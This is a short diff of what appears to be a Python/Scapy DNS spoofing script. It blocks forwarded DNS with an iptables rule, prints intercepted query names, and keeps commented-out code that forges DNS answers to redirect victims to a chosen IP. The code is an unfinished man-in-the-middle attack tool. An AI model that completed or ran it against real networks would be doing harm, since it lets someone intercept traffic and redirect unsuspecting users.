@@ -15,8 +15,9 @@ firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
 Popen([firewall], shell=True, stdout=PIPE)
 
 def dnsspoof(recieved : IP):
-    if recieved.haslayer(DNS) and recieved.getlayer(DNS).qr==0:
-        print(recieved.getlayer(DNS).qd.qname)
+    print(recieved.getlayer(DNS).qd.qname)
+    #if recieved.haslayer(DNS) and recieved.getlayer(DNS).qr==0:
+        
         #if recieved.getlayer(DNS).qd.qname==
         #spoof = (Ether()/ IP(dst=recieved[IP].src, src=recieved[IP].dst)/UDP(dport=recieved[UDP].sport, sport=recieved[UDP].dport)/DNS(id=recieved[DNS].id, qd=recieved[DNS].qd, qr=1,an=DNSRR(rrname=recieved[DNS].qd.qname, ttl=10, rdata=gotoIP) ))
         #sendp(spoof, verbose=1)
